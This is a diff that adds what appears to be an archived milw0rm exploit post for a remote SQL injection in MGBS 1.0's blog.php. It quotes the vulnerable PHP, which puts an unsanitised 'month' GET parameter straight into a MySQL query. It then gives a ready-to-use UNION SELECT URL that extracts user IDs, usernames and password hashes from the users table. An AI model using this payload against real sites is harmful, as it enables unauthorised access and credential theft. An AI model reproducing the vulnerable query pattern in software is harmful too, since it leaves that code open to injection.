@@ -1,0 +1,20 @@
+# MGBS 1.0 Remote SQL injection
+
+# Script url http://sourceforge.net/project/showfiles.php?group_id=193233
+
+# Vulnerable code in blog.php 
+ 
+ <?php
+   $month = $_GET['month'];
+   $result = mysql_query("SELECT * FROM blog WHERE posted='$month' ORDER BY id DESC") or die("HELP QUERY BROKEN");
+   ...
+
+# Admin hash exploit
+
+http://[target]/[path]/blog.php?month='+union+select+1,2,3,4,5,concat_ws(0x3a,id,uname,upass),7,8+from+users/*
+
+# Bug discovered by The_HuliGun
+
+# Greetz to: forum.antichat.ru
+
+# milw0rm.com [2008-01-21]
